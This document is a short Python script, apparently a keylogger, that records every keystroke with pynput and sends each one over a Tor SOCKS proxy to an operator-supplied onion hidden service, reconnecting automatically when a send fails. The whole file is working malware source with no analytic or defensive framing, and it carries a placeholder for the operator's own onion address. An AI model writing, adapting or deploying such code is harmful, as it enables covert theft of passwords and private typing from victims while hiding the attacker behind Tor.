import socket
import socks
import time
from pynput import keyboard

# Set up the socks socket
socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
socket.socket = socks.socksocket


def on_key_press(key):
    try:
        message = f"Key pressed: {key.char}"
    except AttributeError:
        message = f"Special key pressed: {key}"
    try:
        s.sendall(message.encode('utf-8'))
    except Exception as e:
        print(f"Error sending data: {e}")
        reconnect()


def on_key_release(key):
    pass


def connect_to_server():
    while True:
        try:
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the host machine
            host_onion = 'ONION_ADDRESS'  # Replace with your .onion address
            host_port = 80  # The port you specified in your HiddenServicePort
            s.connect((host_onion, host_port))
            return s
        except Exception as e:
            print(f"Connection failed, retrying{e}")


def reconnect():
    global s
    s.close()
    s = connect_to_server()


s = connect_to_server()

try:
    with keyboard.Listener(
            on_press=on_key_press,
            on_release=on_key_release) as listener:
        listener.join()
except Exception as e:
    print(f"Error in listener: {e}")
    reconnect()
